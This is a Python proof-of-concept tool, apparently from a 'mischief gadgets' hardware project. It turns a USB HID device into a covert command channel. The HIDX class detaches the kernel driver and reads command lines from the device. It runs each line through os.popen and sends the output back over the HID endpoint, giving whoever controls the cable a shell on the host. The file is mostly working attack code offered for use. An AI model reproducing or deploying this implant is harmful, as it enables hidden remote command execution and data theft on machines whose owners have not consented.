# NOTE: This is a POC only
# This has certain limitations on size of packets and writes
# You may need root access to use this.
# mischief gadgets, wasabi 2023

##### 
##### NOTE: THIS REQUIRES pyusb and libusb (either via pip3 install libusb_package or libusb1.0 library on your system)
#####

import os
import sys
import string
import select
import pkgutil
import usb.core as uc
import usb.util as uu
import importlib
import argparse

from datetime import datetime

# CHANGE THESE TO YOUR CABLES VID AND PID

from pprint import pprint

class HIDX():
    def __init__(self,vid=None,pid=None,debug=False,sbuff=8,rbuff=8):
        # device information and endpoints
        self.vid = None
        self.pid = None
        self.int = None
        self.dev = None
        self.dev_backend = None
        self.reattach = False
        self.cfg = None
        self.debug = debug
        # set sizes
        self.read_buff_size = rbuff
        self.write_buff_size = sbuff
        # code handlers for errors and messages
        self.send_buff = []
        self.recv_buff = []
        self.read_errors = 0
        self.write_errors = 0
        # start things if we need...
        if vid and pid:
            setup = self.setup_dev(vid=vid,pid=pid)
            self.vid = vid
            self.pid = pid
            if self.debug:
                self.find_devs()
            if not setup:
                print("Failed to initalize.")
                sys.exit(1)         
        else:
            print("No VID or PID Provided")
            self.find_devs()
            
        
    def display_dev(self,vid=None,pid=None):
        if not vid and not pid:
            hvid = hex(self.vid)
            hpid = hex(self.pid)
        else:
            hvid = hex(vid)
            hpid = hex(pid)
        return f"VendorID={hvid} ({vid}), ProductID={hpid} ({pid}). [R:{self.read_buff_size}/S:{self.write_buff_size}]"


    def do_cmd(self,cmd):
      debug_send = False
      if debug_send:
         print(f"CMD = {cmd}")
         dt = datetime.now().strftime("%M:%S.%f")
         user_input = f"HST {dt}\n"
         return user_input
      else:
         c = os.popen(cmd)
         r = c.read()
      return r
    
    def find_devs(self):
        dev = None
        try:
            dev = uc.find(find_all=True)
            self.dev_backend = "pyusb"
        except uc.NoBackendError:
            if pkgutil.find_loader('libusb_package'):
                libusb_package = importlib.import_module('libusb_package')
                self.dev_backend = "libusb_package"
                dev = libusb_package.find(find_all=True)
            else:
                print("No suitable backend was found. Attempted to use libusb (pyusb) and libusb_package+pyusb. ")
                return False
        if dev:
            print("Detecting Available USB Devices:")
            for cfg in dev:
                print('\tUSB Device Found: VendorID=' + hex(cfg.idVendor) + ' & ProductID=' + hex(cfg.idProduct) + '\n')
            print("\n")
        else:
            print("Unable to enumerate available USB Devices. Likely permissions issues!")
    
    def setup_dev(self,vid,pid):
        dev = None
        dev_id = self.display_dev(vid,pid)
        if self.debug:
            print(f"Attempting to find Device: {dev_id}")
        try:
            dev = uc.find(idVendor=vid, idProduct=pid)
            pprint(dev)
            self.dev_backend = "pyusb"
            if self.debug:
                print("Using pyusb+libusb")
        except uc.NoBackendError:
            if pkgutil.find_loader('libusb_package'):
                libusb_package = importlib.import_module('libusb_package')
                self.dev_backend = "libusb_package"
                dev = libusb_package.find(idVendor=vid, idProduct=pid)
                if self.debug:
                    print("Using pyusb+lisbusb_package")
            else:
                print("No suitable backend was found. Attempted to use libusb (pyusb) and libusb_package+pyusb. ")
                return False
        if not dev:
            print(f"Could not find device: {dev_id}")
            return False
        self.reattach = False
        try:
            if hasattr(dev,"is_kernel_driver_active") and dev.is_kernel_driver_active(2):
                self.reattach = True
                dev.detach_kernel_driver(2)
        except NotImplementedError:
            pass
        self.cfg = dev.get_active_configuration()
        self.int = self.cfg.interfaces()[2]
        self.dev = dev
        print(f"Found and Connecting to Device: {dev_id}")
        return True

    def pad_input(self,input_str, left_pad=False, right_pad=False, chunk_size = 8):
        if left_pad and right_pad:
            raise Exception("Cannot add padding on both the left and right side!")
        # default to right pad
        if not left_pad and not right_pad:
            right_pad = True
        padding_length = (chunk_size - (len(input_str) % chunk_size)) % chunk_size
        padded_str = None
        if isinstance(input_str, bytes):
            input_str = self.decode_msg(input_str)
        if right_pad:
            padded_str = input_str + ' ' * padding_length    
        if left_pad:
            padded_str = ' ' * padding_length + input_str
        return padded_str

    def split_output(self,message,chunk_size=8):
        chunks = []
        for i in range(0,len(message),chunk_size):
            raw_message = message[i:i+chunk_size]
            padded_message = self.pad_input(raw_message,right_pad=True)
            chunks.append(padded_message)
        return chunks
    

    def write(self,msg=None, buffer_limit=8):
        endpoint = self.int.endpoints()[1]
        error = False
        start_buffer_size = len(self.send_buff)
        write_bytes = 0
        if msg:
            self.send_buff=self.send_buff+self.split_output(bytes(msg,'utf-8'),chunk_size=buffer_limit)
        if self.debug:
           print(f"Msg:{msg} = {self.send_buff}")
        if len(self.send_buff)>0:
            try:
                part = b""
                if len(self.send_buff)>0:
                    part = self.send_buff.pop(0)
                endpoint.write(part)
                write_bytes = len(part)
                end_buffer_size = len(self.send_buff)
                if self.debug:
                   print(f"Write Buffer: ob:{start_buffer_size},wb:{write_bytes},eb:{end_buffer_size}")
            except Exception as e:
                print(f"Error in write, {e}")
                error = True
        return error, write_bytes


    def _read(self, buffer_limit=8,report_size=8,timeout=200):
        endpoint = self.int.endpoints()[0]
        res = None
        error = False
        raw_message = b""
        recv_packets = 0
        recv_bytes = 0
        try:
            remainder = buffer_limit+report_size*2
            while (remainder > report_size):
                if self.debug:
                    print("In _read loop...")
                remainder -= report_size
                rawdata = bytes(self.dev.read(endpoint.bEndpointAddress, report_size, timeout)).rstrip(b"\x00")
                procdata = b""
                for _r in rawdata:
                    if 32 <= _r <= 126 or _r in [10]:
                        procdata+=chr(_r).encode()
                raw_message+=procdata
                #print(f"{remainder}/{report_size} = {procdata}")
                recv_packets += 1
                recv_bytes += len(rawdata)
        except uc.USBTimeoutError:
            pass
        except uc.USBError:
            print("Lost device, must attempt to reconnect.")
            #self.reattach=True
            #self.setup_dev(self.vid,self.pid)
            error = True
            pass # for now so we just time out eventually
        # do a decode
        if recv_packets>0:
            data_str = ""
            for c in raw_message:
                data_str += chr(c)
            res = data_str
        else:
            pass

        return error, recv_packets, recv_bytes, res
        
    def read(self, retries=1):
        raw_message = b""
        empty_message = 0
        error = False
        recv_bytes=0
        recv_packet=0
        while retries>0:
            if self.debug:
                print("In read loop...")
            try:
                error, recv_packet, recv_byte, raw_data = self._read(
                    buffer_limit=(self.read_buff_size*4),
                    report_size=self.read_buff_size
                )
                recv_bytes+=recv_byte
                recv_packet+=recv_packet
                if error:
                    print("! Error detected in read()")
                    return raw_message
                if recv_byte == 0:
                    retries-=1
                else:
                    print("Test Byte")
                    raw_message+=bytes(raw_data,'utf-8')
                    break
            except:
                error=True
                retries-=1
        if self.debug:
            print("debug: listening for data")
        return error, recv_packet, recv_bytes, raw_message

    def setWriteBuffSize(self,size):
        self.write_buff_size = size
        return size
    
    def setReadBuffSize(self,size):
        self.read_buff_size = size
        return size    

    def decode_msg(self,data):
        content = None
        try:
            content = data.decode('utf-8')
        except UnicodeDecodeError:
            content = data.decode('latin-1')
        return content 

    def start(self,max_errors=5):
        iter = 1
        clear_errcnt = 0 
        while self.write_errors < max_errors and self.read_errors < max_errors:
            result = None
            read_error, recv_packet, recv_bytes, raw_message = self.read()
            
            if self.debug:
                print("In main loop...")
            
            if read_error:
                self.read_errors+=1
            else:
                if recv_bytes > 0 and len(raw_message)>1:
                    commands = raw_message.decode("utf-8").rstrip().replace("\\n","\n").split("\n")
                    for command in commands:
                        if self.debug:
                            print("In command loop...")
                        result = None
                        cleaned_command = command.rstrip().replace("\n","").replace("\r","").rstrip().strip()
                        if self.debug:
                            print(f"RECV: '{cleaned_command}'\n")
                        try:
                            result = self.do_cmd(cleaned_command)
                        except Exception as e:
                            print(f"error! {e}")
                        if result and self.debug:
                            print("Got new data!")
                        if result:
                            result = result + "\x07\x17\x00\x00"
                        write_error,send_bytes = self.write(result,self.write_buff_size)
                        if write_error:
                            self.write_errors+=1
            result=None
            write_error,send_bytes = self.write(result,self.write_buff_size)
            if write_error:
                self.write_errors+=1      
            iter += 1
            if (clear_errcnt > 24):
                self.read_errors = 0
                self.write_errors = 0
    
    def send(self,message,max_errors=5):
        iter = 1
        clear_errcnt = 0 
        write_error,send_bytes = self.write(message,self.write_buff_size)
        self.write_errors =+ 1
        if self.debug:
            print("Sending message: %d" % len(message))
        while len(self.send_buff)>0 and (self.write_errors < max_errors and self.read_errors < max_errors):
            result = message
            write_error,send_bytes = self.write(None,self.write_buff_size)
            if write_error:
                self.write_errors+=1      
            iter += 1
            if (clear_errcnt > 24):
                self.read_errors = 0
                self.write_errors = 0
        if self.write_errors>2:
            print(f"Send incomplete. Total errored packets: {self.write_errors}")
        else:
            print("Send Complete")

if __name__ == "__main__":

    def clean_id(inmsg):
        hexstr = "0x"+str(inmsg).lower().replace("0x","")
        return int(hexstr,16)
    

    def read_stdin():
        content = None
        # to work around certain windows errors that may pop up
        try:
            if not sys.stdin.isatty():
                data = sys.stdin.buffer.read().strip()
                if data:
                    try:
                        # Try decoding using 'utf-8'
                        content = data.decode('utf-8')
                    except UnicodeDecodeError:
                        # If 'utf-8' decoding fails, try 'latin-1'
                        content = data.decode('latin-1')
        except:
            pass
        return content  
        
    parser = argparse.ArgumentParser(description="HIDUniversal Tool")

    parser.add_argument("--vid", type=str, default="0xd3c0", help="Specify vid parameter")
    parser.add_argument("--pid", type=str, default="0xd34d", help="Specify pid parameter")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("--readbuff", type=int, help="Specify read buffer size",default=8)
    parser.add_argument("--sendbuff", type=int, help="Specify send buffer size",default=8)

    args = parser.parse_args()
    debug = False
    if args.debug:
        debug=True
        print("Starting Up...")
    
    hdx = HIDX(vid=clean_id(args.vid),pid=clean_id(args.pid),rbuff=int(args.readbuff),debug=debug,sbuff=int(args.sendbuff))
    stdin_data = read_stdin()
    if stdin_data:
        if debug:
           print("In STDIN Mode")
        hdx.send(stdin_data)
    else:
        if debug:
            print("In Interactive Shell Mode")
        hdx.start()


